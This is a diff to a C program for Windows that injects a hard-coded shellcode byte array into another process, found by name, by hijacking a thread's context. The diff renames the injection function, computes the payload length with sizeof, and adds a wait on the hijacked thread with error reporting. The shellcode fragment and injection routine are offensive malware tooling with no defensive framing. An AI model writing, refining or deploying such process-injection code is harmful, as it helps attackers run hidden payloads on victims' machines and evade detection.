@@ -38,7 +38,7 @@ unsigned char payload[] =
     "\x4C\x4C\x00\x49\x8B\xCC\x41\xFF\xD7\x49\x8B\xCC\x48\x8B\xD6"
     "\xE9\x14\xFF\xFF\xFF\x48\x03\xC3\x48\x83\xC4\x28\xC3";
 
-unsigned int payload_len = 434;
+size_t payload_len = sizeof(payload);
 
 // Find PID from a Process Name
 DWORD find_pid(const char* procname) {
@@ -110,7 +110,7 @@ DWORD find_threadid(DWORD pid) {
     return 0;
 }
 
-int inject_proc(DWORD pid) {
+int inject_thread_context(DWORD pid) {
     CONTEXT ctx;
     DWORD dResult;
     BOOL bResult;
@@ -210,6 +210,14 @@ int inject_proc(DWORD pid) {
         return -1;
     }
 
+    int _result = WaitForSingleObject(hThread, -1);
+    if (_result != 0) {
+        fprintf(stderr, "[!] WaitForSingleObject() failed (0x%x) with code 0x%x\n", GetLastError(), _result);
+        CloseHandle(hProcess);
+        CloseHandle(hThread);       
+        return -1;
+    } 
+
     CloseHandle(hProcess);
     CloseHandle(hThread);
     return 0;
@@ -225,7 +233,7 @@ int main() {
 
     printf("[i] %s: %d\n", TARGET, pid);
 
-    int result = inject_proc(pid);
+    int result = inject_thread_context(pid);
     if (result != 0) 
         fprintf(stderr, "[!] Injection failed\n");
     else 
